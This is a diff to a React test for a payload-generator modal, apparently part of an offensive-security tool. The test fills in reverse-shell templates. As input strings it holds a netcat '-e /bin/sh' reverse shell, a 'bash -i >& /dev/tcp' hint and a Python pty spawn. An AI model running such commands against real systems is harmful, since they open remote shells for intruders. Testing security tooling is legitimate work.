@@ -234,8 +234,8 @@ describe('PayloadGeneratorModal (F-33)', () => {
       expect(screen.getAllByText('Bash Interactive TCP').length).toBeGreaterThan(0);
     });
 
-    // Click 'New' button
-    const newBtn = screen.getByTitle('Add new template to external file');
+    // Click 'New Payload' button in list header
+    const newBtn = screen.getByRole('button', { name: /New Payload/i });
     fireEvent.click(newBtn);
 
     expect(screen.getByText('NEW PAYLOAD TEMPLATE')).toBeDefined();
@@ -244,7 +244,18 @@ describe('PayloadGeneratorModal (F-33)', () => {
     const nameInput = screen.getByPlaceholderText(/e\.g\. Bash - Dev TCP Reverse/i);
     fireEvent.change(nameInput, { target: { value: 'Python PTY Exploit' } });
 
-    const cmdInput = screen.getByPlaceholderText(/e\.g\. bash -i >& \/dev\/tcp/i);
+    // Insert variable placeholder via button and verify textarea keeps/regains focus
+    const cmdInput = screen.getByPlaceholderText(/e\.g\. bash -i >& \/dev\/tcp/i) as HTMLTextAreaElement;
+    fireEvent.change(cmdInput, {
+      target: { value: 'nc  443 -e /bin/sh' },
+    });
+    cmdInput.setSelectionRange(3, 3);
+    fireEvent.click(screen.getByRole('button', { name: '{{LHOST}}' }));
+    await waitFor(() => {
+      expect(document.activeElement).toBe(cmdInput);
+    });
+
+    // Replace with full test payload before saving
     fireEvent.change(cmdInput, {
       target: { value: 'python3 -c \'import pty,os; pty.spawn("/bin/bash")\'' },
     });
